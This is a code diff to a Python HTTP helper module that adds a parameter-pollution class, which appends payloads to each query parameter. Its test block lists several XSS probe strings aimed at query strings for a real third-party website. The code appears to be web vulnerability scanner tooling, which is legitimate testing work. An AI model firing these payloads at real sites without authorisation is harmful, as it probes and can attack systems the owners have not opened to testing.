@@ -9,6 +9,7 @@ and some function like is_http and so on
 import urlparse
 import ssl
 import re
+import json
 import socket
 import time
 import httplib
@@ -153,7 +154,7 @@ class TURL(object):
 
 
 class THTTPJOB(object):
-    """docstring for THHTPJOB"""
+    """docstring for THTTPJOB"""
     def __init__(self, 
                 url, 
                 method='GET', 
@@ -185,7 +186,7 @@ class THTTPJOB(object):
         :is_json: if the data is json
         :time_check: if return the check time
         """
-        super(THHTPJOB, self).__init__()
+        super(THTTPJOB, self).__init__()
         if isinstance(url, TURL):
             self.url = url
         else:
@@ -300,6 +301,80 @@ def is_https(url, port=None):
 
 
 
+class Pollution(object):
+    """
+    this class aim to use the payload
+    to the param in requests
+    """
+    def __init__(self, query, payloads, pollution_all=False, isjson=False):
+        """
+        :query: the url query part
+        :payloads:  List, the payloads to added in params
+        :data: if url is POST, the data is the post data
+        """
+        self.payloads = payloads
+        self.query = query
+        self.isjson = isjson
+        self.pollution_all = pollution_all
+        self.polluted_urls = []
+
+        if type(self.payloads) != list:
+            self.payloads = [self.payloads,]
+
+    def pollut(self):
+        if self.isjson:
+            query_dict = json.loads(self.query)
+        else:
+            query_dict = dict(urlparse.parse_qsl(self.query, keep_blank_values=True))
+    
+        for key in query_dict.keys():
+            for payload in self.payloads:
+                tmp_qs = query_dict.copy()
+                tmp_qs[key] = tmp_qs[key] + payload
+                self.polluted_urls.append(tmp_qs)
+
+    def payload_generate(self):
+        print self.payloads
+        if self.pollution_all:
+            pass
+        else:
+            self.pollut()
+            return self.polluted_urls
+
+
+
+
+
+
+class Url:
+
+    @staticmethod
+    def url_parse(url):
+        return urlparse.urlparse(url)
+
+    @staticmethod
+    def url_unparse(data):
+        scheme, netloc, url, params, query, fragment = data
+        if params:
+            url = "%s;%s" % (url, params)
+        return urlparse.urlunsplit((scheme, netloc, url, query, fragment))
+
+    @staticmethod
+    def qs_parse(qs):
+        return dict(urlparse.parse_qsl(qs, keep_blank_values=True))
+
+    @staticmethod
+    def build_qs(qs):
+        return urllib.urlencode(qs).replace('+', '%20')
+
+    @staticmethod
+    def urldecode(qs):
+        return urllib.unquote(qs)
+
+    @staticmethod
+    def urlencode(qs):
+        return urllib.quote(qs)
+
 if __name__ == '__main__':
     file = 'img.png'
     filetype='image/png'
@@ -308,3 +383,14 @@ if __name__ == '__main__':
     hj2 = THTTPJOB('www.iqiyi.com', method='POST', files=True, filename=file, data=data)
     hj2.request()
     assert hj2.response.status_code == 200
+
+    xss = [
+        "\" onfous=alert(document.domain)\"><\"",
+        "\"`'></textarea><audio/onloadstart=confirm`1` src>",
+        "\"</script><svg onload=alert`1`>",
+        # "\"`'></textarea><audio/onloadstart=confirm`1` src>",
+    ]
+
+    url = 'http://www.iqiyi.com/path/?p=v&p2=v2'
+    query = 'p=v&p2=v2'
+    print Pollution(query, xss).payload_generate()
